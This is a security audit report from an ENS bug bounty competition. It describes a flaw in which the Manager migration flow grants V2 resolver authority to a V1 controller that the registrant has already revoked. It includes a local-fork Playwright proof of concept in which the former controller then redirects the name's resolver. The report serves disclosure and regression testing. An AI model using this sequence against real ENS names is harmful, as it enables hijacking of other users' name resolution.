# 92609 w a medium stale v1 controller snapshot grants a revoked controller v2 resolver authority during migration

**Submitted on Sep 10th 2026 at 22:05:53 UTC by @Paulius for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92609
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

The Manager migration flow records the V1 registry controller when it builds the migration preview, then uses that saved address in a later V2 role grant. It never checks that the address is still the current V1 controller before submitting the final atomic migration transaction.

For an unwrapped `.eth` name, the BaseRegistrar registrant can revoke a compromised or untrusted V1 controller with `BaseRegistrar.reclaim`. If the registrant performs that recovery after the preview, then completes the already-prepared Manager flow, the migration grants `ROLE_SET_RESOLVER` to the controller they removed. The flow does not show the recipient address, verifies the stale grant as a success condition, and leaves it after cleanup. The removed controller can then point the migrated name to a resolver it controls.

## Vulnerability Details

### The controller is read from indexed V1 state

The migration name query asks the V1 subgraph for both the registry owner and the BaseRegistrar registrant:

```graphql
domains(...) {
  id
  labelName
  labelhash
  name
  resolver { address }
  owner { id }
  registrant { id }
  wrappedOwner { id }
  ...
}
```

For an unwrapped `.eth` registration, `classifyName` treats the registrant as the token holder and a different registry owner as the manager:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

This distinction is correct at the time of the read. The problem is that `managerAddress` becomes part of the migration plan and is later treated as immutable authority data.

The source query is cached for five minutes. More importantly, once `buildMigrationPlan` receives the `domains` array, it stores the resulting `classified` entries in the plan that is passed through the migration state machine and every wallet prompt.

### The pre-submit check does not revalidate the controller

Before opening the first wallet prompt, `assertMigrationApprovalPlanCurrent` checks whether the set of missing approvals still matches the preview. It does not read the V1 registry owner.

Before each atomic batch, `buildNextAtomicBatch` refreshes two kinds of live state:

```ts
const resolverReadiness =
  await checkDeterministicMigrationResolverReadiness(...)

const directRoutes = await resolveDirectMigrationRoutes({
  publicClient: ctx.publicClient,
  classified: remaining,
})
```

The batch is still rebuilt from `remaining`, which contains the original `ClassifiedName` objects. No call reads the current V1 registry owner and no comparison is made against `classified.managerAddress`.

This leaves a practical window across the preview, HCA deployment, token approval, manager-restoration approval, final wallet prompt, and any retry. The V1 controller can change during that window without invalidating the plan.

### The stale address is encoded into the atomic batch

For every classified name with a manager, `buildNameExecution` appends a manager role grant after the migration call:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
}
```

`buildRoleGrantCall` encodes the saved address directly:

```ts
return {
  to: V2_CONTRACTS.ETHRegistry,
  data: encodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    functionName: 'grantRoles',
    args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
  }),
  value: 0n,
}
```

The execution order is resolver setup, migration, manager role grant, and profile replay. These calls are wrapped in one `HCA.executeByOwner` call, so a successful receipt confirms both the migration and the stale role grant.

### The contract guard does not bind the grantee to current V1 state

When manager restoration is needed, the user is prompted to approve the HCA as an operator on the V2 `ETHRegistry`:

```ts
case 'eth-registry:hca':
  return {
    kind: 'operator',
    id: params.id,
    contractAddress: V2_CONTRACTS.ETHRegistry,
    operatorAddress: params.hcaAddress,
  }
```

The corresponding transaction is `setApprovalForAll(HCA, true)`. That operator permission is what allows the HCA to make the later `grantRoles` call on behalf of the V2 name owner.

The V2 registry checks whether the caller is authorized to grant the requested role. That check succeeds because the HCA is the victim's approved operator. The registry has no V1 controller input to compare with the grantee. The migration receiver also receives the saved migration data, not a requirement that the later role recipient equal the current V1 registry owner.

The contracts therefore behave as requested. The application supplies an outdated grantee while holding the authority needed to make the grant succeed.

### Verification accepts the stale grant

The application creates a `manager-role` verification expectation using the same saved address:

```ts
{
  type: 'manager-role',
  account: classified.managerAddress,
  roleBitmap: ROLE_SET_RESOLVER,
  ...
}
```

After the transaction receipt succeeds, `verifyAtomicMigrationBatch` calls `hasRoles` for that address. This confirms that the outdated role was granted and marks the batch as verified. It does not compare the address with current V1 state.

The final cleanup only removes the temporary HCA operator approval. It does not revoke the manager role that was created inside the batch. The removed V1 controller is left with persistent V2 resolver authority.

### Example attack sequence

1. The victim owns the unwrapped BaseRegistrar ERC-721 for `victim.eth` and had delegated V1 controller authority to the attacker or another untrusted address.
2. The victim opens the Manager migration page. The V1 query records the victim as registrant and the attacker as `domain.owner`.
3. Manager builds a plan containing `managerAddress = attacker`.
4. Before confirming migration, the victim recovers the V1 controller using `BaseRegistrar.reclaim(tokenId, victim)`. The ENS Registry now reports the victim as controller and the attacker has no V1 authority.
5. The victim continues the already prepared migration and confirms the final atomic transaction.
6. The migration registers the V2 name to the victim, then the HCA calls `ETHRegistry.grantRoles(resource, ROLE_SET_RESOLVER, attacker)`.
7. The transaction confirms. The application's post-state checks find the attacker role and report the batch as verified.
8. Cleanup revokes the HCA's temporary operator approval but leaves the attacker's role in place.
9. The attacker calls `setResolver` on the migrated name and selects an attacker-controlled resolver.

## Impact Details

This meets the listed Critical impact for hijacking an ENS name during a Manager migration. The victim's confirmed Manager transaction creates new V2 authority for an address that is no longer authorized in the live V1 state. With `ROLE_SET_RESOLVER`, that address can change where the migrated name resolves.

An attacker can point the name to a resolver that returns an attacker-controlled address, alter records served for the name, or keep changing the resolver until the victim discovers and revokes the role. The owner and registration token remain assigned to the victim, but resolution is controlled by the removed delegate. For ENS users and applications, that is a direct name hijack.

The important state change is not a preview or an unsent transaction. The application submits the `executeByOwner` transaction, waits for a successful receipt, verifies that the stale role exists at the receipt block, and presents the migration as complete.

Here the registrant has removed the controller with the standard BaseRegistrar recovery action before execution, but the application creates fresh V2 authority for it anyway. The attacker is an independent address, and its `ROLE_SET_RESOLVER` grant survives HCA cleanup.

## References

* [Competition-branch Manager asset snapshot](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager): immutable competition-branch snapshot corresponding to the selected program asset.
* [apps/manager/src/features/migration/service/v1SubgraphClient.ts:22-47](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L22-L47): fetches the V1 registry owner, registrant, and resolver.
* [apps/manager/src/features/migration/hooks/useV1Names.ts:12-23](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23): caches the V1 name response for five minutes.
* [packages/migration/src/service/classifyNames.ts:137-184](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L137-L184): converts a differing V1 registry owner into `managerAddress` for an unwrapped registration.
* [apps/manager/src/features/migration/service/buildMigrationPlan.ts:317-380](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildMigrationPlan.ts#L317-L380): stores the classified snapshot and builds the preview batches.
* [apps/manager/src/features/migration/service/migrationService.ts:338-390](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L338-L390): checks the approval plan but not the current V1 controller.
* [apps/manager/src/features/migration/service/migrationService.ts:886-960](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L886-L960): rebuilds each live batch from the saved classified entries.
* [apps/manager/src/features/migration/service/migrationService.ts:1044-1107](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L1044-L1107): submits the outer call, waits for its receipt, and runs post-state verification.
* [apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:479-491](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L479-L491), [608-624](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624), [742-815](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L742-L815): creates the migration data, stale manager grant, execution order, and HCA outer call.
* [apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:8-26](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26): encodes `grantRoles` with the saved manager address.
* [apps/manager/src/features/migration/service/migrationApprovals.ts:116-122](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationApprovals.ts#L116-L122), [186-193](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationApprovals.ts#L186-L193), [320-350](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationApprovals.ts#L320-L350): grants the HCA temporary operator access for manager restoration.
* [apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:337-353](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts#L337-L353): verifies the stale address's role and accepts the batch.
* [apps/manager/src/features/migration/service/migrationService.ts:449-478](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L449-L478): cleanup revokes the HCA approval only.
* [apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-89](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89): describes generic manager restoration without identifying the saved address.
* `BaseRegistrarImplementation.reclaim(uint256,address)`: the unwrapped-name registrant can set the ENS Registry controller, which is the recovery action used in the PoC.
* [apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:8-26](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L26) and [buildAtomicMigrationBatches.ts:48](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L48), [623](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L623): the deployed role bitmap for `ROLE_SET_RESOLVER` is `1n << 24n` and is granted to the saved manager address.
* [packages/smart-account/src/providers/rhinestone/owner-execution.ts:5-39](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/smart-account/src/providers/rhinestone/owner-execution.ts#L5-L39): wraps the migration operations in one owner-authorized HCA call.
* [packages/transaction-manager/src/actors/eoa-transport.actor.ts:35-70](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/eoa-transport.actor.ts#L35-L70): submits the final transaction with the connected owner wallet.
* [apps/manager/src/features/migration/MIGRATION\_CASE\_STUDY.md:70-100](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/MIGRATION_CASE_STUDY.md#L70-L100): documents the receiver checks and use of `Migration.Data.owner`, `resolver`, and `subregistry` for unwrapped and unlocked migrations.

## Link to Proof of Concept

<https://gist.github.com/pauliax/062b90c291141b1eba8b967f7ee1fe41>

## Proof of Concept

## Proof of Concept

### Local regression test

The regression test at `e2e/projects/manager/tests/migration-stale-controller.spec.ts` reproduces the defect through the production Manager migration UI and the repository's isolated Anvil-fork E2E environment. It uses a V1-registration fixture adapted for the local fork, the real `BaseRegistrar.reclaim` recovery call, a V1-subgraph response whose `registrant` and current controller differ, the normal wallet authorization flow, and direct on-chain assertions. It also sends the removed controller's subsequent V2 `setResolver` call.

The following excerpt contains the security-relevant transaction sequence. `V` is the victim/registrant and `A` is the former V1 controller. The fixture creates an unwrapped V1 registration owned by V; the test then creates the normal V1 registrant/controller split before Manager reads the name:

```ts
const owner = privateKeyToAccount(accounts.getPrivateKey('user')) // V
const formerController = privateKeyToAccount(
  accounts.getPrivateKey('user2'), // A
)
const makeV1Name = createMakeV1Name({ userAccount: owner })
const v1Name = await makeV1Name({ label: 'controller-state' })
const label = v1Name.replace('.eth', '')
const node = namehash(v1Name)
const tokenId = BigInt(keccak256(toHex(label)))

// V delegates V1 registry-controller authority to A before the preview.
await reclaimV1Controller(tokenId, owner, formerController.address)
expect((await readV1Controller(node)).toLowerCase()).toBe(
  formerController.address.toLowerCase(),
)

await mockV1Subgraph(page, [{
  name: v1Name,
  ownerAddress: owner.address,       // V1 BaseRegistrar registrant: V
  managerAddress: formerController.address, // V1 Registry controller: A
}], { includeRemoteDomains: false })
await page.goto(`${MANAGER_APP_URL}/migration`, {
  waitUntil: 'domcontentloaded',
})
await expect(page.getByRole('button', { name: 'Upgrade 1 name' }))
  .toBeEnabled({ timeout: 60_000 })
```

The following is the critical time-of-check/time-of-use transition. It occurs after Manager has read and classified the V1 controller but before V confirms the migration. `BaseRegistrar.reclaim` is a real V1 contract call, and the following assertion reads the real local-fork V1 ENS Registry state:

```ts
// V removes A's V1 controller authority before confirming migration.
await reclaimV1Controller(tokenId, owner, owner.address)
expect((await readV1Controller(node)).toLowerCase()).toBe(
  owner.address.toLowerCase(),
)

// V completes the ordinary Manager UI flow; all local wallet prompts are
// authorized exactly as the application requests them.
const success = page.getByRole('heading', {
  name: 'Your name has been upgraded!',
})
let migrationFinished = false
await Promise.all([
  (async () => {
    try {
      await page.getByRole('button', { name: 'Upgrade 1 name' }).click()
      await success.waitFor({ state: 'visible', timeout: 90_000 })
    } finally {
      migrationFinished = true
    }
  })(),
  authorizeTransactionsWhile(page, wallet, () => migrationFinished),
])
```

Finally, the test reads the resulting V2 state and proves that A can exercise the newly created authority. This is not a UI-only assertion: `assertHasRoles` reads `ETHRegistry.roles(labelHash, account)` and masks the expected role bit; the final receipt is from A's direct V2 `setResolver` transaction. The test chooses A's EOA as the new resolver only to demonstrate that the registry accepts A's selected address; a real attack would select a resolver contract controlled by A.

```ts
await assertV2Registered(label)
await assertHasRoles(label, formerController.address, ROLE_SET_RESOLVER)

const setResolverHash = await walletClient.sendTransaction({
  account: formerController,
  to: V2_ETH_REGISTRY,
  data: encodeFunctionData({
    abi: permissionedRegistrySetResolverSnippet,
    functionName: 'setResolver',
    args: [labelToCanonicalId(label), formerController.address],
  }),
})
expect((await publicClient.waitForTransactionReceipt({
  hash: setResolverHash,
})).status).toBe('success')
await assertV2Resolver(label, formerController.address)
```

The V1 fixture is deliberately local-fork-only. The local patch to `e2e/fixtures/makeV1Name.ts` impersonates the historical BaseRegistrar owner on Anvil, adds a local test controller, then calls `BaseRegistrar.register` and `BaseRegistrar.reclaim` directly. The resulting on-chain state is an ordinary unwrapped V1 ERC-721 registration for V.

For the local-only reproduction, the dedicated Playwright configuration uses `127.0.0.1:8545` for Sepolia RPC and starts Manager with `VITE_E2E_FORCE_MIGRATION=true`. The PoC artifact contains two local Manager edits absent from the pinned audit revision: `get-feature-flag.ts` returns `true` only when `import.meta.env.DEV`, that variable is `true`, and the requested flag is the migration flag; `useMigrationGasFunding.ts` skips the unfunded local `/wallet/fund` request under the same development-only condition and returns `settled` because the Anvil accounts are pre-funded. Neither edit changes migration-plan construction, approval sequencing, final calldata, post-state verification, or cleanup. They only make the isolated E2E environment deterministic and do not target, query, or mutate a public ENS deployment.

The local patch is limited to the following guards and return-path changes:

```ts
const isLocalE2EMigration =
  import.meta.env.DEV && import.meta.env.VITE_E2E_FORCE_MIGRATION === 'true'

if (isLocalE2EMigrationFlag(data.flag)) return true

const enabled = !!ownerAddress && !isLocalE2EMigration
if (!ownerAddress) return 'idle'
if (isLocalE2EMigration) return 'settled'
```

The mock V1-subgraph response deliberately continues to contain A after `BaseRegistrar.reclaim`. This preserves the preview-time indexed snapshot from which Manager built the plan and models the existing five-minute query cache; the test does not claim that a fresh post-reclaim indexer response would report A. The application flaw remains that it does not read the live V1 controller before constructing the final batch.

Start the local E2E infrastructure, then run the test. Its dedicated Playwright configuration starts the Manager development server with the documented local Anvil and Mockestrator settings and a development-only local migration-flag override; production flag behavior is unchanged:

```bash
pnpm e2e:infra:up
pnpm --dir e2e exec playwright test projects/manager/tests/migration-stale-controller.spec.ts --config projects/manager/playwright.migration-poc.config.ts
```

Preconditions:

* Use an unwrapped V1 `.eth` registration.
* Account V is the BaseRegistrar registrant and migration wallet.
* Account A is the V1 ENS Registry owner for the name when Manager loads it.
* The V2 name is reserved as expected by the repository's migration fixtures.

The test performs the following sequence:

1. It registers and reserves an unwrapped V1 name for V with the adapted local-fork fixture described above.
2. V uses `BaseRegistrar.reclaim` to assign V1 ENS Registry controller authority to A; the test confirms that V1 state.
3. The Manager UI reads the name from the normal mocked V1-subgraph boundary with `registrant.id = V` and `owner.id = A`, then builds its migration plan.
4. Before V confirms the migration, V uses `BaseRegistrar.reclaim` to recover V1 controller authority. The test confirms on-chain that A no longer controls the V1 name.
5. V completes the normal Manager transaction authorization. The test waits for the ordinary success UI, then confirms the V2 registration and that A holds `ROLE_SET_RESOLVER`.
6. A submits V2 `setResolver` for the migrated resource and the test confirms the V2 resolver equals A's chosen address.

Expected behavior:

Manager should re-read the current V1 registry owner immediately before constructing the final batch, or the migration call should bind any restored manager to the current on-chain V1 controller. If the controller changed after preview, the application should invalidate the plan and require the user to review a new one.

Actual behavior:

Manager reuses the preview-time address, grants it `ROLE_SET_RESOLVER`, verifies that grant as a successful post-condition, and completes the migration. The former controller can then change the migrated name's resolver.

```ts
// e2e/projects/manager/tests/migration-stale-controller.spec.ts

import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { permissionedRegistrySetResolverSnippet } from '@ensdomains/ensjs-abi/v2/permissionedRegistry'
import { encodeFunctionData, keccak256, namehash, parseAbi, toHex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  createMakeV1Name,
  V1_BASE_REGISTRAR,
  V1_ENS_REGISTRY,
  V2_ETH_REGISTRY,
} from '../../../fixtures/makeV1Name.js'
import {
  authorizeTransactionsWhile,
  expect,
  test,
} from '../../../fixtures/playwright.manager.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'
import {
  assertHasRoles,
  assertV2Registered,
  assertV2Resolver,
} from '../../../helpers/migration-assertions.js'
import { mockV1Subgraph } from '../../../helpers/mock-v1-subgraph.js'

const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
// RegistryRolesLib packs this role at nybble position 6 in the deployed V2 registry.
const ROLE_SET_RESOLVER = 1n << 24n

const V1_REGISTRY_ABI = parseAbi([
  'function owner(bytes32 node) view returns (address)',
])

const V1_BASE_REGISTRAR_ABI = parseAbi([
  'function reclaim(uint256 id, address owner)',
])

async function reclaimV1Controller(
  tokenId: bigint,
  account: ReturnType<typeof privateKeyToAccount>,
  controller: `0x${string}`,
) {
  const hash = await walletClient.sendTransaction({
    account,
    to: V1_BASE_REGISTRAR,
    data: encodeFunctionData({
      abi: V1_BASE_REGISTRAR_ABI,
      functionName: 'reclaim',
      args: [tokenId, controller],
    }),
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
}

async function readV1Controller(node: `0x${string}`) {
  return publicClient.readContract({
    address: V1_ENS_REGISTRY,
    abi: V1_REGISTRY_ABI,
    functionName: 'owner',
    args: [node],
  })
}

test.describe('Manager migration controller state', () => {
  test.describe.configure({ timeout: 300_000 })

  test('grants resolver authority to a controller revoked by the registrant', async ({
    migrationConnectedPage: page,
    wallet,
    accounts,
  }) => {
    const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
    const formerController = privateKeyToAccount(
      accounts.getPrivateKey('user2'),
    )
    const makeV1Name = createMakeV1Name({ userAccount: owner })
    const v1Name = await makeV1Name({ label: 'controller-state' })
    const label = v1Name.replace('.eth', '')
    const node = namehash(v1Name)
    const tokenId = BigInt(keccak256(toHex(label)))

    // The registrant assigns a separate controller before Manager reads the
    // name, which is the normal V1 registrant/controller split.
    await reclaimV1Controller(tokenId, owner, formerController.address)
    expect((await readV1Controller(node)).toLowerCase()).toBe(
      formerController.address.toLowerCase(),
    )

    await mockV1Subgraph(
      page,
      [
        {
          name: v1Name,
          ownerAddress: owner.address,
          managerAddress: formerController.address,
        },
      ],
      { includeRemoteDomains: false },
    )

    // The local config authorizes the server-side migration route. The dashboard
    // banner separately reads its client-side PostHog flag, which deliberately
    // remains disabled without a PostHog service in this isolated environment.
    // Manager keeps background queries open (including optional local API
    // calls), so `networkidle` never becomes true in the focused stack. The
    // upgrade action below is the actual bounded readiness condition.
    await page.goto(`${MANAGER_APP_URL}/migration`, {
      waitUntil: 'domcontentloaded',
    })

    const confirmButton = page.getByRole('button', { name: 'Upgrade 1 name' })
    await expect(confirmButton).toBeEnabled({ timeout: 60_000 })

    // The registrant revokes the controller using BaseRegistrar.reclaim before
    // approving the migration. The V1 registry now confirms it has no control.
    await reclaimV1Controller(tokenId, owner, owner.address)
    expect((await readV1Controller(node)).toLowerCase()).toBe(
      owner.address.toLowerCase(),
    )

    const successIndicator = page.getByRole('heading', {
      name: 'Your name has been upgraded!',
    })
    let migrationFinished = false
    await Promise.all([
      (async () => {
        try {
          await confirmButton.click()
          await successIndicator.waitFor({ state: 'visible', timeout: 90_000 })
        } finally {
          migrationFinished = true
        }
      })(),
      // A stale manager requires an additional ETH Registry approval and its
      // cleanup after migration. Approve every queued local-wallet request,
      // rather than only the first one and leaving the flow parked at step 2.
      authorizeTransactionsWhile(page, wallet, () => migrationFinished),
    ])

    await page.getByRole('button', { name: 'Close' }).click()

    await assertV2Registered(label)
    await assertHasRoles(label, formerController.address, ROLE_SET_RESOLVER)

    // A former V1 controller can use the retained V2 role to choose a new
    // resolver for the migrated name without the registrant's authorization.
    const setResolverHash = await walletClient.sendTransaction({
      account: formerController,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: permissionedRegistrySetResolverSnippet,
        functionName: 'setResolver',
        args: [labelToCanonicalId(label), formerController.address],
      }),
    })
    const setResolverReceipt = await publicClient.waitForTransactionReceipt({
      hash: setResolverHash,
    })
    expect(setResolverReceipt.status).toBe('success')
    await assertV2Resolver(label, formerController.address)
  })
})
```

```ts
// e2e/projects/manager/playwright.migration-poc.config.ts

import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../playwright.config.base.js'

const configDirectory = path.dirname(fileURLToPath(import.meta.url))
const managerDirectory = path.resolve(configDirectory, '../../../apps/manager')
const managerUrl = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'

/**
 * Runs the focused migration regression coverage. The standard Manager E2E
 * config excludes migration specs while that broader suite remains disabled.
 */
export default defineConfig({
  ...baseConfig,
  timeout: 300_000,
  testDir: './tests',
  use: {
    ...baseConfig.use,
    baseURL: managerUrl,
  },
  // The migration flow needs the existing local Anvil/Mockestrator stack, but
  // Playwright can safely manage the Manager development server itself.
  webServer: process.env.MANAGER_APP_URL
    ? undefined
    : {
        command: 'pnpm dev',
        cwd: managerDirectory,
        url: managerUrl,
        timeout: 120_000,
        reuseExistingServer: !process.env.CI,
        env: {
          ...process.env,
          VITE_SEPOLIA_RPC_URL: 'http://127.0.0.1:8545',
          VITE_RHINESTONE_ENDPOINT_URL: '/orchestrator',
          VITE_RHINESTONE_CUSTOM_RPC_URLS:
            '{"11155111":"http://127.0.0.1:8545"}',
          // Lets the existing E2E client-side PostHog override initialize
          // without making a request to an external analytics service.
          VITE_PUBLIC_POSTHOG_KEY: 'e2e-local',
          VITE_PUBLIC_POSTHOG_HOST: 'http://127.0.0.1:3000',
          // Accounts are funded directly by the local Anvil fixture; no API
          // worker/faucet runs as part of this focused stack.
          VITE_E2E_FORCE_MIGRATION: 'true',
        },
      },
  projects: [
    {
      name: 'manager-migration-poc',
      testMatch:
        /(?:migration-stale-controller|migration-resolver-pointer)\.spec\.ts$/,
    },
  ],
})
```
